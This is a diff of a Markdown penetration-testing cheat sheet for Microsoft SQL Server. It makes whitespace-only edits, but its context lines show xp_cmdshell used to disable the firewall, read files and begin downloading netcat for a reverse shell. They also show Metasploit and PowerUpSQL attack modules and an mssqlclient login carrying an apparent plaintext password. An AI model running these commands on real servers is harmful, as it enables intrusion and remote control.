@@ -18,12 +18,11 @@ nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [I
 use auxiliary/admin/mssql/mssql_enum
 set RHOSTS [IP]
 exploit
-
 ```
 
-#### mssql\_exec&#x20;
+#### mssql\_exec
 
-The mssql\_exec admin module takes advantage of the xp\_cmdshell stored procedure to execute commands on the remote system. If you have acquired or guessed MSSQL admin credentials, this can be a very useful module.&#x20;
+The mssql\_exec admin module takes advantage of the xp\_cmdshell stored procedure to execute commands on the remote system. If you have acquired or guessed MSSQL admin credentials, this can be a very useful module.
 
 ```
 msf auxiliary(mssql_exec) > set CMD netsh firewall set opmode disable
@@ -49,11 +48,11 @@ exploit
 
 ### PowerUpSQL
 
-PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server&#x20;
+PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server
 
-Link: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)&#x20;
+Link: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
 
-Example:&#x20;
+Example:
 
 ```
 PS /opt/PowerUpSQL> Import-Module .\PowerUpSQL.psd1  
@@ -141,7 +140,7 @@ exploit
 
 ## Connecting to MSSQL
 
-Connect using one of the following options:&#x20;
+Connect using one of the following options:
 
 ### sqsh
 
@@ -151,7 +150,7 @@ sqsh -S someserver -U sa -P password
 
 ### metasploit
 
-metasploit (mssql\_login)&#x20;
+metasploit (mssql\_login)
 
 ```
 msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
@@ -159,7 +158,7 @@ msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
 
 ### mssqclient
 
-Impacket script [mssqclient](broken-reference)&#x20;
+Impacket script [mssqclient](broken-reference/)
 
 ```
 mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
@@ -208,7 +207,7 @@ EXEC xp_cmdshell "type C:\file.txt"
 
 ## Reverse shell
 
-Download a netcat file to the remote server&#x20;
+Download a netcat file to the remote server
 
 ```
 SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
@@ -234,7 +233,7 @@ server                           CONNECT SQL
 server                           VIEW ANY DATABASE
 ```
 
-Check out the databases available:&#x20;
+Check out the databases available:
 
 ```
 SQL> SELECT name FROM master.sys.databases 
@@ -247,7 +246,7 @@ msdb
 volume 
 ```
 
-I can look for user generated tables on those databases:&#x20;
+I can look for user generated tables on those databases:
 
 ```
 SQL> use volume 
